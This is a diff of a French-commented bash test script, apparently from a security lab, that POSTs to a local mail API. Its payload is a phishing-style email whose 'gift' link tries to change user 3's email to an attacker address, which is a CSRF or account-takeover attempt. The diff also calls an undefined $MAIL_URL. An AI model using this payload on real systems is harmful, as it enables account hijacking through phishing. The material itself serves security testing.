@@ -14,12 +14,14 @@ fi
 URL="http://127.0.0.1/controller/api/user/mail.php"
 
 # Données malveillantes
-DATA="receiver_emails=hacker@gmail.com&title=Bravo&content=<a href='https://www/functions/user/mail.php?id=3&new_email=hacker2@gmail.com'>Cliquez ici pour un cadeau!</a>&send_email=1"
+DATA="receiver_emails=hacker@gmail.com&title=Test&content=<a href='https://www/functions/user/mail.php?id=3&new_email=hacker2@gmail.com'>Cliquez ici pour un cadeau!</a>&send_email=1"
 
 # Points initiaux
-points=2000
+# points=2000
 
-response=$(curl -s -L -i -X POST "$URL" -d "$DATA")
+response=$(curl -s -L -i -X POST "$MAIL_URL" \
+    -d "$DATA" \
+    -b $COOKIE_FILE)
 
 # Afficher la réponse complète pour le débogage (optionnel)
 echo "----------------------------------------"
@@ -39,9 +41,7 @@ if echo "$response" | grep -q "200 OK"; then
     fi
 
 else
-    points=$((points - 200))
     echo "Requête échouée. Vérifiez l'URL ou les paramètres."
-    echo "Points restants : $points"
 fi
 
 echo "----------------------------------------"
